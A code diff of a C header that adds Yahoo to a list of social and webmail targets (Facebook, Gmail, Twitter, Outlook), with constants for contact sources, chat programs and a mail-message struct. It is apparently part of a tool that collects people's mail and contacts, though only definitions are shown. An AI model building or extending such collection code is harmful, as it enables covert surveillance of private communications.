@@ -3,17 +3,19 @@
 #include <Windows.h>
 #pragma pack(1)
 
-#define SOCIAL_ENTRY_COUNT 4
+#define SOCIAL_ENTRY_COUNT 6
 
 #define FACEBOOK_DOMAIN L"facebook.com" // FIXME array-izza!
-#define GMAIL_DOMAIN L"mail.google.com"
-#define TWITTER_DOMAIN L"twitter.com"
-#define OUTLOOK_DOMAIN L"live.com"
+#define GMAIL_DOMAIN	L"mail.google.com"
+#define YAHOO_DOMAIN	L"yahoo.com"
+#define TWITTER_DOMAIN	L"twitter.com"
+#define OUTLOOK_DOMAIN	L"live.com"
 
-#define FACEBOOK_DOMAINA "facebook.com"
-#define GMAIL_DOMAINA "mail.google.com"
-#define TWITTER_DOMAINA "twitter.com"
-#define OUTLOOK_DOMAINA "live.com"
+#define FACEBOOK_DOMAINA	"facebook.com"
+#define GMAIL_DOMAINA		"mail.google.com"
+#define YAHOO_DOMAINA		"yahoo.com"
+#define TWITTER_DOMAINA		"twitter.com"
+#define OUTLOOK_DOMAINA		"live.com"
 
 
 #ifndef _DEBUG
@@ -34,6 +36,7 @@
 
 #define CHAT_PROGRAM_FACEBOOK 0x02
 #define CHAT_PROGRAM_TWITTER  0x03
+#define CHAT_PROGRAM_YAHOO	  0x0F
 
 #define CONTACTS_MYACCOUNT 0x80000000
 
@@ -42,6 +45,7 @@
 #define CONTACT_SRC_FACEBOOK 3
 #define CONTACT_SRC_TWITTER  4
 #define CONTACT_SRC_GMAIL    5
+#define CONTACT_SRC_YAHOO    0x0F
 
 #define DEFAULT_MAX_MAIL_SIZE (1024*1000)
 
@@ -101,6 +105,7 @@ typedef struct SOCIAL_MAIL_MESSSAGE_HEADER
   FILETIME fDate;			 // data di ricezione approssimativa del messaggio
  #define MAIL_GMAIL     0x00000000
  #define MAIL_OUTLOOK	0x00000004
+ #define MAIL_YAHOO     0x00000006
   DWORD dwProgram;
 } SOCIAL_MAIL_MESSSAGE_HEADER, *LPSOCIAL_MAIL_MESSSAGE_HEADER;
 
